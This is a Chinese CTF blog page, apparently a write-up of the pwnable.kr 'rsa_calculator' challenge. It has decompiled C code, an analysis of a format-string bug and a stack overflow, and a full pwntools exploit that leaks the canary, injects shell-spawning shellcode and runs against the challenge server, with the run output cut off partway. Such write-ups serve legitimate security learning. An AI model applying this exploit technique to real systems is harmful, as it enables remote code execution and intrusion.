(05c4ccfd4880c92339b995c7754ec2e6567f2ed91d955cb7144c1b6037855db1b3a8525e74d30fd4505bb38c975b86f23d0e5aa23eed44b9beaa7e2195da93ba53cb08758a261ada5612245f49d25b81aa5a297aa5d555886073b17e2ed719b3607da6fbfe40b260a45485910404d69c818a2faedac7bb3a727cfbb53eab8406)</span><br><span class="line">hi admin, here is your flag</span><br><span class="line">byte to byte leaking against block cipher plaintext is fun!!</span><br><span class="line"></span><br><span class="line">root@kali:~/Desktop/<span class="built_in">test</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>很有意思的一次pwn。</p>

          
        
      
    </div>

    

    
    
    

    

    <div>
      
    </div>

    <div>
      
    </div>

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://r00tnb.github.io/2018/03/14/pwnable.kr-rsa_calculator/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="r00tnb">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="R00tnb's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/03/14/pwnable.kr-rsa_calculator/" itemprop="url">
                  pwnable.kr-rsa_calculator
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2018-03-14 12:59:32" itemprop="dateCreated datePublished" datetime="2018-03-14T12:59:32+08:00">2018-03-14</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2018-08-04 22:32:31" itemprop="dateModified" datetime="2018-08-04T22:32:31+08:00">2018-08-04</time>
              
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/03/14/pwnable.kr-rsa_calculator/#comments" itemprop="discussionUrl">
                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2018/03/14/pwnable.kr-rsa_calculator/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/03/14/pwnable.kr-rsa_calculator/" class="leancloud_visitors" data-flag-title="pwnable.kr-rsa_calculator">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数：</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>读代码题，虽然是逆向代码，哈哈。这道题得细心找，不能急，否则就得像我一样花了很长时间在<code>printf</code>的漏洞利用上了，悲催。</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>分析反编译代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">set_key</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [sp+18h] [bp-18h]@7</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [sp+1Ch] [bp-14h]@7</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [sp+20h] [bp-10h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+24h] [bp-Ch]@7</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+28h] [bp-8h]@7</span></span><br><span class="line">  __int16 v6; <span class="comment">// [sp+2Ch] [bp-4h]@1</span></span><br><span class="line">  __int16 v7; <span class="comment">// [sp+2Eh] [bp-2h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"-SET RSA KEY-"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"p : "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"q : "</span>, &amp;v6);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"p, q, set to %d, %d\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v6, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v7);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"-current private key and public keys-"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"public key : "</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%02x "</span>, pub[i]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\npublic key : "</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%02x "</span>, pri[i]);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  v4 = v6 * v7;</span><br><span class="line">  v5 = (v6 - <span class="number">1</span>) * (v7 - <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"N set to %d, PHI set to %d\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v4, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v5);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"set public key exponent e : "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"set private key exponent d : "</span>, &amp;v1);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v5 &amp;&amp; v2 &lt; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v5 &amp;&amp; v2 * v1 % (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v5 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"wrong parameters for key generation"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v4 &lt;= <span class="number">0xFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"key length too short"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  set_pub_key(v1, v4, (__int64)pub);</span><br><span class="line">  set_pri_key(v2, v4, (__int64)pri);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"key set ok"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"pubkey(e,n) : (%d(%08x), %d(%08x))\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v1, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v1, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v4, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"prikey(d,n) : (%d(%08x), %d(%08x))\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v2, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v2, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v4, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v4);</span><br><span class="line">  is_set = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">RSA_decrypt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax@2</span></span><br><span class="line">  <span class="keyword">bool</span> v1; <span class="comment">// dl@10</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// rdx@12</span></span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// rsi@14</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax@15</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx@18</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [sp+Ch] [bp-634h]@3</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [sp+10h] [bp-630h]@5</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+14h] [bp-62Ch]@11</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [sp+18h] [bp-628h]@11</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [sp+1Ch] [bp-624h]@6</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [sp+20h] [bp-620h]@12</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [sp+21h] [bp-61Fh]@12</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [sp+22h] [bp-61Eh]@12</span></span><br><span class="line">  <span class="keyword">char</span> ptr; <span class="comment">// [sp+2Fh] [bp-611h]@6</span></span><br><span class="line">  <span class="keyword">char</span> v15[<span class="number">1024</span>]; <span class="comment">// [sp+30h] [bp-610h]@9</span></span><br><span class="line">  <span class="keyword">char</span> src[<span class="number">520</span>]; <span class="comment">// [sp+430h] [bp-210h]@11</span></span><br><span class="line">  __int64 v17; <span class="comment">// [sp+638h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v17 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( is_set )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"how long is your data?(max=1024) : "</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt;= <span class="number">1024</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      fgetc(<span class="built_in">stdin</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"paste your hex encoded data"</span>);</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v1 = v6-- != <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v1 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v10 = fread(&amp;ptr, <span class="number">1u</span>LL, <span class="number">1u</span>LL, <span class="built_in">stdin</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v10 )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ( ptr == <span class="number">10</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v15[v7++] = ptr;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memset</span>(src, <span class="number">0</span>, <span class="number">0x200</span>uLL);</span><br><span class="line">      i = <span class="number">0</span>;</span><br><span class="line">      v9 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">2</span> * v7 &gt; i )</span><br><span class="line">      &#123;</span><br><span class="line">        v11 = v15[i];</span><br><span class="line">        v12 = v15[i + <span class="number">1</span>];</span><br><span class="line">        v13 = <span class="number">0</span>;</span><br><span class="line">        v2 = &amp;src[v9++];</span><br><span class="line">        __isoc99_sscanf(&amp;v11, <span class="string">"%02x"</span>, v2);</span><br><span class="line">        i += <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v3 = src;</span><br><span class="line">      <span class="built_in">memcpy</span>(g_ebuf, src, v7);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; v7 / <span class="number">8</span> &gt; i; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = pri;</span><br><span class="line">        v4 = decrypt(g_ebuf[i], (__int64)pri);</span><br><span class="line">        *(&amp;g_pbuf + i) = v4;</span><br><span class="line">      &#125;</span><br><span class="line">      *(&amp;g_pbuf + i) = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"- decrypted result -"</span>);</span><br><span class="line">      <span class="built_in">printf</span>(&amp;g_pbuf, v3);                      <span class="comment">// /格式化字符串漏洞</span></span><br><span class="line">      <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"data length exceeds buffer size"</span>);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"set RSA key first"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v17;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> *v3; <span class="comment">// rsi@1</span></span><br><span class="line">  <span class="keyword">bool</span> v5; <span class="comment">// dl@4</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [sp+Ch] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = <span class="number">0L</span>L;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"- Buggy RSA Calculator -\n"</span>);</span><br><span class="line">  func[<span class="number">0</span>] = (__int64)set_key;</span><br><span class="line">  qword_602508 = (__int64)RSA_encrypt;</span><br><span class="line">  qword_602510 = (__int64)RSA_decrypt;</span><br><span class="line">  qword_602518 = (__int64)help;</span><br><span class="line">  qword_602520 = (__int64)myexit;</span><br><span class="line">  dword_602528 = <span class="number">1634629488</span>;</span><br><span class="line">  dword_60252C = <span class="number">778398818</span>;</span><br><span class="line">  dword_602530 = <span class="number">1936290411</span>;</span><br><span class="line">  dword_602534 = <span class="number">1953719650</span>;</span><br><span class="line">  qword_602538 = (__int64)system;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"\n- select menu -"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"- 1. : set key pair"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"- 2. : encrypt"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"- 3. : decrypt"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"- 4. : help"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"- 5. : exit"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt; "</span>, v3);</span><br><span class="line">    v3 = &amp;v6;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v6 + <span class="number">1</span>) &gt; <span class="number">6</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">int</span> *))func[(<span class="keyword">unsigned</span> __int64)(<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v6 - <span class="number">1</span>)])(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">    v5 = g_try++ &gt; <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"this is demo version"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"invalid menu"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码对于我来说还是有点长的，哈哈。贴了几个关键的函数，大致分析一下程序很容易找到在<code>RSA_decrypt</code>函数中存在<code>printf</code>格式化字符串漏洞，利用该漏洞可以读写内存。但是仔细分析后发现，仅仅利用该漏洞无法更改返回地址或则是got表。那就需要寻找另外的漏洞了。<br>接下来就是仔细分析程序各个部分的功能找出漏洞，经过简单分析可以发现另外两处漏洞。</p>
<ul>
<li><code>set_key</code>函数在设置<code>key</code>时没有严格按照RSA算法的要求（具体算法百度），导致可以很容易设置想要的值。</li>
<li><code>RSA_decrypt</code>函数中，在向<code>src</code>变量赋值时存在栈溢出。</li>
</ul>
<p>主要看看这个栈溢出。输入的密文<code>v15</code>是一个16进制编码的字符串，这里就是将<code>v15</code>转化为字符串存到<code>src</code>中。如果<code>v15</code>的长度为最大1024字节，那么这里的循环次数就是<code>2×v7/2=1024</code>，而每次循环<code>src</code>都要赋一个字节的值，所以循环<code>520</code>次后就开始覆盖栈的其他空间了。继续分析，其实当循环<code>512</code>次后<code>v15</code>的索引就已经越界了，其后就是<code>src</code>变量。那么后续覆盖返回地址和写shellcode就是使用<code>src</code>中的16进制编码的字符串了。当然<code>RSA_decrypt</code>函数是有<code>stack canary</code>的，需要先利用格式化字符串漏洞leak出来。<br>整理利用思路，这里我先leak处<code>canary</code>，然后利用栈溢出覆盖返回地址为<code>pri</code>变量的地址之后跟shellcode，并利用<code>set_key</code>函数的缺陷设置<code>pri</code>的值为<code>jmp rsp</code>指令。这样当函数返回时会跳转到<code>pri</code>执行<code>jmp rsp</code>从而执行shell。下面贴出exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strToHex</span><span class="params">(s)</span>:</span></span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        ret += <span class="string">'&#123;:02x&#125;'</span>.format(ord(i))</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work</span><span class="params">(DEBUG)</span>:</span></span><br><span class="line">    context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'info'</span>)</span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        r = process(<span class="string">'./rsa_calculator'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">'pwnable.kr'</span>,<span class="number">9012</span>)</span><br><span class="line">        </span><br><span class="line">    pri_addr = <span class="number">0x602960</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment">#set key</span></span><br><span class="line">    r.sendline(<span class="string">'1'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'p : '</span>)</span><br><span class="line">    r.sendline(<span class="string">'61\n53\n17\n2753'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#get stack canary</span></span><br><span class="line">    r.sendline(<span class="string">'2\n1024\n%205$016lx'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'(hex encoded) -\n'</span>)</span><br><span class="line">    cipher = r.recvline()</span><br><span class="line">    r.sendline(<span class="string">'3\n1024\n'</span>+cipher)</span><br><span class="line">    r.recvuntil(<span class="string">'- decrypted result -\n'</span>)</span><br><span class="line">    stack_canary = int(r.recvline(),<span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    r.sendline(<span class="string">'1\n3\n29312\n1\n58623'</span>) <span class="comment">#asm('jmp rsp')=0xe4ff=58623</span></span><br><span class="line">    r.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    tmp = strToHex(<span class="string">'a'</span>*<span class="number">8</span>+p64(stack_canary)+<span class="string">'a'</span>*<span class="number">8</span>+p64(pri_addr)+asm(shellcraft.sh())) <span class="comment">#set retaddr=pri_addr</span></span><br><span class="line">    r.sendline(<span class="string">'3\n1024\n'</span>+strToHex(tmp+<span class="string">'30'</span>*(<span class="number">1024</span>-len(tmp))))</span><br><span class="line">    </span><br><span class="line">    r.interactive()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">work(<span class="keyword">False</span>)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@1:~/桌面/<span class="built_in">test</span>$ python 1.py </span><br><span class="line">[+] Opening connection to pwnable.kr on port 9012: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">-SET RSA KEY-</span><br><span class="line">p : q : p, q, <span class="built_in">set</span> to 3, 29312</span><br><span class="line">-current private key and public keys-</span><br><span class="line">public key : 11 00 00 00 a1 0c 00 00 </span><br><span class="line">public key : c1 0a 00 00 a1 0c 00 00 </span><br><span class="line">N <span class="built_in">set</span> to 87936, PHI <span class="built_in">set</span> to 58622</span><br><span class="line"><span class="built_in">set</span> public key exponent e : <span class="built_in">set</span> private key exponent d : key <span class="built_in">set</span> ok</span><br><span class="line">pubkey(e,n) : (1(00000001), 87936(00015780))</span><br><span class="line">prikey(d,n) : (58623(0000e4ff), 87936(00015780))</span><br><span class="line"></span><br><span class="line">- select menu -</span><br><span class="line">- 1. : <span class="built_in">set</span> key pair</span><br><span class="line">- 2. : encrypt</span><br><span class="line">- 3. : decrypt</span><br><span class="line">- 4. : <span class="built_in">help</span></span><br><span class="line">- 5. : <span class="built_in">exit</span></span><br><span class="line">&gt; how long is your data?(max=1024) : paste your 